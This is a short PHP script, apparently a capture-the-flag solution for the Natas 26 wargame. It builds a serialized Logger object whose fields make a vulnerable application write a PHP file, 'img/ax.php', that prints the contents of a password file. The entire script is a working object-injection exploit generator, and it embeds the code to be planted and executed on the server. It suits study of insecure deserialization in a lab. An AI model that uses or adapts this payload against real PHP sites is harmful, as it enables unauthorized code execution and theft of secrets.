<?php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct(){
            $this->initMsg = "foobar\n";
            $this->exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27');?>";
            $this->logFile = "img/ax.php";
        }                       
                     
    }
$logger = new Logger();
echo base64_encode(serialize($logger));
?>
